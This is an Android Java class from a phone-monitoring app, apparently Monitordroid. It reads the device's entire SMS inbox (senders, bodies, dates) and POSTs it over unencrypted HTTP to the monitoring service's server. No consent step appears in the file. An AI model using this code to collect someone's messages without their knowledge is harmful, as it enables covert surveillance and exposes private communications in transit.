package com.monitordroid.app;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;


import com.google.android.gcm.GCMRegistrar;


public class ReadSMS {
	
	public void fetchSMS(Context context) {
		String output = "";
		output = smsReader(context);
		if (output.length() > 63000) {
			output = output.substring(0, 63000);
		}
		String regId = GCMRegistrar.getRegistrationId(context);
		new MyAsyncTask().execute(output, regId);		
	}
	
	private String smsReader(Context context) {
		Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
		cursor.moveToFirst();
		String msgData = "";
		do{
		   for(int idx=0;idx<cursor.getColumnCount();idx++)
		   {
			   if (cursor.getColumnName(idx).equals("address") || cursor.getColumnName(idx).equals("body") || cursor.getColumnName(idx).equals("date")) {
				   if (cursor.getColumnName(idx).equals("address")) {
					   msgData += "\n" + cursor.getString(idx) + " - ";
				   }
				   else if (cursor.getColumnName(idx).equals("date")) {
					   String formattedDate = "";
					   formattedDate = millisToDate(cursor.getLong(idx));
					   msgData += formattedDate + ": ";
				   }
				   else {
					   msgData += cursor.getString(idx);
				   }
			   }
		   }

		}while(cursor.moveToNext());
		return msgData;
	}
	
	private String millisToDate(long currentTime) {
	    String finalDate;
	    Calendar calendar = Calendar.getInstance();
	    calendar.setTimeInMillis(currentTime);
	    Date date = calendar.getTime();
	    finalDate = date.toString();
	    return finalDate;
	}
	

	
	private class MyAsyncTask extends AsyncTask<String, String, Double>{
		 
		@Override
		protected Double doInBackground(String... params) {
		// TODO Auto-generated method stub
		postData(params[0], params[1]);
		return null;
		}
		 
		protected void onPostExecute(Double result){

		}

		@SuppressWarnings("unused")
		public void postData(String valueIWantToSend, String regId) {
		// Create a new HttpClient and Post Header
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost("http://www.monitordroid.com/app/postsms.php");
		 
		try {
		List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>();
		nameValuePairs.add(new BasicNameValuePair("SMSData", valueIWantToSend));
		nameValuePairs.add(new BasicNameValuePair("regName", regId));
		httppost.setEntity(new UrlEncodedFormEntity(nameValuePairs));
		 
		// Execute HTTP Post Request
		HttpResponse response = httpclient.execute(httppost);
		 
		} catch (ClientProtocolException e) {
		// TODO Auto-generated catch block
		} catch (IOException e) {
		// TODO Auto-generated catch block
		}
		}
		 
		}	

}
